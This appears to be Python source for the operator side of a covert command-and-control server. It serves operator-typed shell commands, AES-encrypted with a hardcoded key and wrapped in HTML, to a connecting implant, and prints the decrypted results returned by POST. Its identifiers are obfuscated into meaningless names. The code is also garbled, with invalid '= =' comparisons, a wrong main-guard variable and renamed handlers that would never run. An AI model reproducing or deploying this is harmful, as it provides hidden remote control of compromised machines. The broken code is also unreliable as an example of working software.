import pyaes
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
from time import sleep
from sys import stdin, argv
b1 = b"This_key_for_demo_purposes_only!"
def fonk1(b8):
    b2 = pyaes.AESModeOfOperationCTR(b1)
    b3 = b2.encrypt(b8)
    b4 = base64.b64encode(b3).decode()
    return b4
def fonk2(b8):
    b2 = pyaes.AESModeOfOperationCTR(b1)
    b5 = base64.b64decode(b8)
    b6 = b2.decrypt(b5).decode('utf-8')
    return b6
b7 = []
class class1(BaseHTTPRequestHandler):
    def fonk3(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
    def fonk4(self):
        self.fonk3()
        try:
            b8 = input('$ ')
        except KeyboardInterrupt:
            b9 = input('Quit? (y/n/r/c)')
            if b9 = = 'y':
                exit(0)
            elif b9 = = 'r':
                print('Restarting server ...')
                return False
            elif b9 = = 'c':
                print('Command history: ')
                for cmd in b7:
                    print(cmd)
            else:
                print('Waiting for reconnection ...')
                return
        else:
            b7.append(b8)
            b8 = fonk1(b8)
            b10 = ("<html><body><h1>%s</h1></body></html>" % b8).encode()
            try:
                self.wfile.write(b10)
            except BrokenPipeError:
                print('Broken Pipe, wait for reconnection ... ')
    def fonk5(self):
        self.fonk3()
    def fonk6(self):
        self.fonk3()
        b11 = int(self.headers['Content-Length'])
        b12 = self.rfile.read(b11)
        b12 = str(b12)
        b13 = b12.strip('<html><body><h1>')
        b13 = b13.strip('</h1></body></html>')
        b14 = fonk2(b13)
        print(b14)
    def fonk7(self, format, *args):
        return
def fonk8(b15 = HTTPServer, handler_class=class1, b19=80):
    b16 = ('0.0.0.0', b19)
    b17 = b15(b16, handler_class)
    print('Starting b17 on %s:%d...' % (b16, b19))
    while True:
        b17.handle_request()
        print('Restarting server ... ')
        sleep(1)
if b18 = = "__main__":
    if len(argv) == 2:
        fonk8(b19 = int(argv[1]))
    else:
        fonk8(b19 = 8880)